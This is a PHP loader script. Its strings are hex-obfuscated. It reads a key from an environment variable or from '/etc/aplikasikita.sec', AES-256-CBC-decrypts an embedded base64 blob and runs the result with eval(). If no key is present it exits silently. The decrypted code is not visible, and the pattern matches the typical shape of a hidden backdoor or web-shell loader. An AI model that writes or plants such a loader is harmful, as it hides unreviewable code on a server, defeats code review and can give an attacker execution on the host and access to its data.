<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Ng3Twq0HulUXX5oow58dEw==');

$c=base64_decode(

'8DjnYCIswQh25RyTN0dV3uHDMUoUPfEifRcXZfPbvTSwKWae0k01Io32p+oSgei32R6adVZb9iVH' .
'7O4+VPb2QNivgMBNevUoBd6rZOLmFEDjY2S4WxAwtLOyeD+RIBn7jqIKEZPH8Q1Wa4+VPJzeKkCN' .
'xJhYi14/Uw8PhAMc8cBArm6yWKr8cvx4bUp05hEbVon5Q7mgRDXJJK914LUJZxa/r/PtMtniK/iR' .
'4r6kmRn0cL5xTrwyIzGouMrAYytK3g/E1aM9Q1xcPJuc6rMGyJogGW7IoWl5Im0WmGPUscbjWoMX' .
'/J/fn6ZKpnSuN8Kj9cbDleth6XeeLaxmtmP8eT1/HPtAGLTeSU5W6aMwZFI/q8KrrVeZxQwLHSad' .
'fVVBMg3SszEdUdfJquhzgL8VR1f9sUBHjpN06PGckeDZxO+CdWoe628XwjKJjpCNuCxifIfPUYqv' .
'GuTcY546B0t+H5h6e2PCqXLPdulWgbNzhvav6xPHQIOmFEJPRjlqU3WskaCFD3n/7q2lNQi0lMbP' .
'IbyZIBIvZNPOgVw3g4rIKKwRHKBTUqzqosz90LXfgQfstADfwQsSlkkWegx9B0tDjEmIvUPCxNK0' .
'lThWNFJ9ZmLNbdrIGhtJCTdCXxR/64joYAfmZfuEWNzCa7zquTWLw68ZhIzVb/+Dlfc2iTSBmPeP' .
'ipZ0GOvr4Ml7TBFgkIEjGdqIDm420Q+vesp+/grpqKuzwaVotvksvg2yhXWpL4o4s2zFe8l+UUeE' .
'dL3e+L61QFgAuAbbSD/al9scNz7jMa4EizDSWuI74dOPUuybYlXu0VI1AAxQPozk4KmExtZaaJ3f' .
'oU+lgfQGbJQEkStIYiG7lfqM6bfc1on10eSeHgvWgmfkHuVOrY9jlOhSLKLnZobkhXxTrlwk/U4n' .
'2N8TShxUIk+Umvmg52QKyEML3aVQXHRiM04dhsUA+ut6arh7AKm9aHuKUxpKekho9Tj7TtWicLDj' .
'Z62kLn9CSjznHDQclgrhX8FeiHmDIfeLtTO7VqpbUrtrAcdIlkoRBbV1lD+PZx0m28YvsiRF3ueh' .
'Y9qwK28nQonfCMx5rhU/Cv4EFd4ZxzBefi94n57Czm82KS4u1/Pf3mlTgnMuDrjAX+cKrf1Xfb6j' .
'swhgUkGiNqy/UA8ZQ1z5MymmH7a+GhWApU9WcSg78o/mf3ssqcN0odhe6MFuxa+uRd5IsgrWmuvr' .
'pjEGbu/LvZzuCrnOnhgTg7uDPmxagXGWOdzfm2tcd4rIwSCZR6WROyNLQDic7Vb+sMwYJbOuERUI' .
'8omaIbgyLBXQSyQkCSGnvjNbUUfO6tqdbEyplUP59HnntHbCqvIkz70B1MYBZEG0SyRQILcmxw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

